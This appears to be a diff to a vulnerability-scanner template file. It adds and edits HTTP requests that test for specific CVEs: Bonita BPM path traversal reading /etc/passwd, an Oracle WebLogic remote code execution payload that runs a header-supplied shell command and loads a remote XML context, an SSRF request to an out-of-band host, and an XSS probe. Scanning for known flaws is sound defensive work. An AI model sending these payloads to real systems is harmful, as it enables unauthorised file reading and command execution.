@@ -3708,6 +3708,22 @@
       ]
     },
     {
+      "id": "CVE-2015-3897",
+      "info": {
+        "name": "Bonita BPM 6.5.1 - Unauthenticated Directory Traversal",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/bonita/portal/themeResource?theme=portal/../../../../../../../../../../../../../../../../&location=etc/passwd",
+            "{{BaseURL}}/bonita/portal/themeResource?theme=portal/../../../../../../../../../../../../../../../../&location=Windows/win.ini"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2015-4050",
       "info": {
         "name": "ESI unauthorized access",
@@ -9029,8 +9045,8 @@
         {
           "body": "url=https://{{Host}}:443@{{interactsh-url}}\n",
           "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "X-Atlassian-Token": "no-check"
+            "X-Atlassian-Token": "no-check",
+            "Content-Type": "application/x-www-form-urlencoded"
           },
           "method": "POST",
           "path": [
@@ -9798,13 +9814,14 @@
     {
       "id": "CVE-2020-14882",
       "info": {
-        "name": "Oracle WebLogic Server Unauthenticated RCE (and Patch Bypass)",
+        "name": "Oracle Weblogic Pre-Auth Remote Command Execution",
         "severity": "critical"
       },
       "requests": [
         {
-          "raw": [
-            "POST /console/images/%252e%252e%252fconsole.portal HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\n\n_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(\"http://{{interactsh-url}}\")\n"
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/console/images/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext('http://{{interactsh-url}}')"
           ]
         }
       ]
@@ -9817,14 +9834,8 @@
       },
       "requests": [
         {
-          "body": "test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField(\"connectionHandler\");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(\"getServletRequest\").invoke(obj); String cmd = req.getHeader(\"Test-Header\");String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\", \"/c\", cmd} : new String[]{\"/bin/sh\", \"-c\", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(\"\\\\A\").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(\"getResponse\").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();')\n",
-          "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Test-Header": "cat /etc/passwd"
-          },
-          "method": "POST",
-          "path": [
-            "{{BaseURL}}/console/images/%252e%252e%252fconsole.portal"
+          "raw": [
+            "POST /console/images/%252e%252e%252fconsole.portal HTTP/1.1\nHost: {{Hostname}}\nAccept-Language: en\nCMD: {{cmd}}\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip, deflate\n\ntest_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField(\"connectionHandler\");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(\"getServletRequest\").invoke(obj); String cmd = req.getHeader(\"CMD\");String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\", \"/c\", cmd} : new String[]{\"/bin/sh\", \"-c\", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(\"\\\\A\").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(\"getResponse\").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();')\n"
           ]
         }
       ]
@@ -14840,8 +14851,8 @@
       "requests": [
         {
           "headers": {
-            "Referer": "{{BaseURL}}/assets/base/home.html",
-            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\""
+            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\"",
+            "Referer": "{{BaseURL}}/assets/base/home.html"
           },
           "method": "GET",
           "path": [
@@ -16362,6 +16373,21 @@
           "path": [
             "{{BaseURL}}/karma.js",
             "{{BaseURL}}/?return_url=javascript:alert(document.domain)"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-0482",
+      "info": {
+        "name": "Easy!Appointments Broken Access Control",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET / HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n",
+            "POST /index.php/backend_api/ajax_get_calendar_events HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\n\ncsrfToken={{csrf_token}}&startDate=2022-01-01&endDate=2022-01-01\n"
           ]
         }
       ]
